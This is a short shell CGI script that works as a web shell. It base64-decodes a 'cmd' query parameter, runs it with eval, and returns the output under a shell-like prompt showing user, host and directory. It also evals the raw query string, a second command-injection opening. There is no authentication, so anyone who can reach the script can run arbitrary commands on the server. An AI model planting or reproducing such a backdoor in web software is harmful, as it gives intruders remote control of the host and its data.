#!/bin/sh
echo "HTTP/1.1 200 OK
Date: $(TZ=GMT0 date +'%a, %d %b %Y %T %Z')
Server: $SERVER_SOFTWARE
Content-type: text/html; charset=UTF-8
Cache-Control: no-store
Pragma: no-cache
"

# parse parameters from query string
eval $(echo ${QUERY_STRING//&/;})

# restore command from Base64 data
c=$(echo $cmd|base64 -d)
[ -z "$c" ] && echo "No command!" && exit

prompt() {
	echo -e "<b>[$(whoami)@$(hostname) $PWD]# ${1}</b>"
}

export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
cd /tmp
prompt "$c\n"
eval $c 2>&1

case "$?" in
126)
	echo "-sh: $c: Permission denied"
	prompt
	;;
127)
	echo "-sh: $c: not found"
	prompt
	;;
0)
	prompt
	;;
*)
	echo -e "\nEXIT CODE: $?"
esac

exit 0
